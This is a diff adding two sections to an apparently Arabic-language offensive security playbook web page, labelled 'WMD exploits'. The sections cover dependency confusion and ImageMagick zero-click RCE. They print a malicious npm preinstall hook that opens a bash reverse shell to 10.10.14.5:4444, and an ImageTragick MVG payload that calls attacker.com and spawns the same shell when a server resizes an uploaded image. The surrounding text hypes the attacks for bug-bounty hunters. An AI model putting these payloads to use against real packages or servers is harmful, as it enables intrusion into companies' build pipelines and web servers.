@@ -6,8 +6,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Offensive Security Playbook & Methodology | Abdo Ramdan</title>
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&family=Outfit:wght@400;600;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="css/style.css?v=14">
-  <link rel="stylesheet" href="css/methodology.css?v=14">
+  <link rel="stylesheet" href="css/style.css?v=15">
+  <link rel="stylesheet" href="css/methodology.css?v=15">
 
   
 
@@ -432,6 +432,23 @@
           </div>
           <div class="meth-item" id="meth-ef-p_scen_takeover" onclick="openMethPhase('p_scen_takeover')" data-search="scenario subdomain takeover cname dns hijacking github pages">
             <span>🏳️</span> <span>Subdomain Takeover</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p_scen_takeover', '🏳️ Subdomain Takeover')">★</button>
+          </div>
+        </div>
+        </div>
+      </div>
+
+      <!-- Category 7: WMD Exploits -->
+      <div class="sidebar-category">
+        <div class="category-title" onclick="toggleCategory('cat-wmd')">
+          <span style="color: #ff0055; text-shadow: 0 0 5px rgba(255,0,85,0.5);">💀 WMD EXPLOITS (DANGER)</span>
+          <span>▼</span>
+        </div>
+        <div class="category-items" id="cat-wmd">
+          <div class="meth-item" id="meth-ef-p_supply" onclick="openMethPhase('p_supply')" data-search="supply chain dependency confusion npm pip takeover">
+            <span>☣️</span> <span style="color: #ff0055;">Supply Chain Attacks</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p_supply', '☣️ Supply Chain Attacks')">★</button>
+          </div>
+          <div class="meth-item" id="meth-ef-p_zeroclick" onclick="openMethPhase('p_zeroclick')" data-search="zero click rce imagemagick ffmpeg media shell">
+            <span>👻</span> <span style="color: #ff0055;">Zero-Click RCE</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p_zeroclick', '👻 Zero-Click RCE')">★</button>
           </div>
         </div>
       </div>
@@ -3166,6 +3183,67 @@ Content-Type: application/json
         <button class="mark-complete-btn" id="complete-btn-p_scen_takeover" onclick="markPhaseComplete('p_scen_takeover','complete')">
           ✅ Mark Phase Complete — Subdomain Takeover Scenario Done → Proceed to Complete Playbook!
         </button>
+</div>
+
+      <!-- Phase WMD 1: Supply Chain -->
+      <div class="meth-content-view" id="meth-content-p_supply" style="display: none; --tool-color: #ff0055;">
+        <div class="cyber-hero" style="border-bottom: 2px solid #ff0055; background: radial-gradient(circle at center, rgba(255,0,85,0.1) 0%, transparent 70%);">
+          <h2 class="hero-title"><span class="hero-icon">☣️</span> Supply Chain & Dependency Confusion</h2>
+          <p class="hero-tagline">أخطر هجوم في العصر الحديث (بمكافآت تتخطى $100,000) لاختراق البنية التحتية من الجذور</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3 style="color:#ff0055;">⚠️ ما هو الـ Dependency Confusion؟</h3></div>
+          <p>تعتمد الشركات (مثل Apple, Microsoft, PayPal) على مكتبات برمجية داخلية (Private Packages) بأسماء خاصة (مثال: <code>paypal-internal-auth</code>). المهاجم يقوم بإنشاء مكتبة خبيثة <strong>بنفس الاسم</strong> ورفعها على المستودعات العامة (NPM أو PyPI) برقم إصدار أعلى (مثال: v99.0.0).</p>
+          <p><strong>الكارثة:</strong> عندما يقوم سيرفر الشركة بتحديث مكاتبه، سيقوم بتحميل مكتبتك الخبيثة من السيرفر العام بدلاً من السيرفر الداخلي لأن رقم الإصدار الخاص بك أعلى!</p>
+          
+          <div class="cmd-ui-box" style="border-color:#ff0055;">
+            <div class="cmd-ui-top" style="color:#ff0055;">
+// Payload in Malicious NPM Package (package.json)
+"scripts": {
+  "preinstall": "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
+}</div>
+          </div>
+          <p style="margin-top:10px; color:var(--text-secondary);">بمجرد أن يقوم المطور أو سيرفر الـ CI/CD بكتابة <code>npm install</code>، ستتلقى اتصالاً عكسياً (Reverse Shell) يخترق الشبكة الداخلية للشركة بالكامل!</p>
+        </div>
+
+        <div class="cyber-card border-neon" style="border-color:#ff0055;">
+          <div class="card-header"><h3 style="color:#ff0055;">👑 Case Study: Alex Birsan ($130,000+)</h3></div>
+          <p>الباحث أليكس بيرسان اخترق أكثر من 35 شركة من كبرى شركات التكنولوجيا (Apple, Microsoft, Shopify, Netflix, Tesla) دفعة واحدة باستخدام هذا التكتيك، وربح أكثر من 130 ألف دولار في أيام معدودة بمجرد قراءة ملفات <code>package.json</code> المكشوفة بالخطأ على GitHub لمعرفة أسماء مكاتبهم الداخلية!</p>
+        </div>
+      
+        <button class="mark-complete-btn" onclick="markPhaseComplete('p_supply','p_zeroclick')">
+          ✅ Mark Phase Complete — Supply Chain Done → Proceed to Zero-Click RCE
+        </button>
+      </div>
+
+      <!-- Phase WMD 2: Zero-Click RCE -->
+      <div class="meth-content-view" id="meth-content-p_zeroclick" style="display: none; --tool-color: #ff0055;">
+        <div class="cyber-hero" style="border-bottom: 2px solid #ff0055; background: radial-gradient(circle at center, rgba(255,0,85,0.1) 0%, transparent 70%);">
+          <h2 class="hero-title"><span class="hero-icon">👻</span> Zero-Click RCE (Media Processing)</h2>
+          <p class="hero-tagline">اختراق الخوادم بمجرد رفع صورة أو ملف فيديو دون أي تفاعل من الضحية</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3 style="color:#ff0055;">📸 ImageMagick & FFMpeg Exploitation</h3></div>
+          <p>الكثير من المواقع تسمح برفع صورة شخصية أو فيديو وتقوم بتغيير حجمه (Resize) أو اقتصاصه (Crop) في الخلفية باستخدام برامج مثل <strong>ImageMagick</strong> أو <strong>FFMpeg</strong>.</p>
+          <p>إذا كان الموقع يستخدم إصداراً قديماً، يمكنك تضمين كود برمجي خبيث داخل خصائص الصورة (Exif Data) أو عبر استغلال ثغرة (ImageTragick CVE-2016-3714). بمجرد أن يفتح السيرفر الصورة لتعديل حجمها، يتم تنفيذ الكود واختراق السيرفر!</p>
+          
+          <h4 style="margin-top:15px; color:#ffaa00;">Polyglot Payload (صورة ملغمة بكود RCE):</h4>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://attacker.com/image.jpg"|bash -i >& /dev/tcp/10.10.14.5/4444 0>&1")'
+pop graphic-context</div>
+          </div>
+          <p style="margin-top:10px; color:var(--text-secondary);">هذا الملف يتم حفظه بصيغة <code>.jpg</code> أو <code>.png</code>. بمجرد رفعه للموقع للـ Profile Picture، السيرفر سيتم تدميره والحصول على صلاحيات Root!</p>
+        </div>
+
+        <button class="mark-complete-btn" onclick="markPhaseComplete('p_zeroclick','complete')">
+          ✅ Mark Phase Complete — Zero-Click RCE Done → Playbook Completed
+        </button>
+      </div>
+
 </div><!-- Popup Modal structure for alert testing -->
   <div class="popup-overlay" id="popupOverlay"></div>
   <div class="popup-modal" id="popupModal">
